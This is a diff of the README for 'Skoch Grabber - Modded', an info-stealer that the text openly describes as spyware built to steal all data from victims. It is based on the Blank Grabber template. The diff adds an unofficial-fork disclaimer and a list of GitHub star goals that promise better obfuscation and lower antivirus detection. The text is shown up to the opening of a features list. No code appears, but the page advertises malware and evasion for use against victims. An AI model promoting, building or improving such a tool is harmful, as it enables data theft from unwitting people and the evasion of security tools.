@@ -1,11 +1,24 @@
-# SKOCH GRABBER
+# SKOCH GRABBER - MODDED
 
 [✅] Skoch Grabber is a powerful spyware to steal every single data from your victims.
 
 [⚠️] This code uses Blank Grabber as the template. It's now been discontinued. Check out [here](https://github.com/blank-c/blank-grabber)
 
-[⚠️] This program is free to use. If you've purchased it from somewhere, then you got scammed.
+[⚠️] THIS IS UNOFFICAL NOT MADE BY THE ACTUAL SKOCH TEAM
 
+# STARS
+```
+0 Stars = Better obfuscation, 9% Detection
+
+5 Stars = Better obfuscation.
+
+10 Stars = Better UI
+
+15 Stars = More features
+
+20 Stars = Better Obfuscation
+
+```
 # FEATURES
 ```
 • GUI Builder.
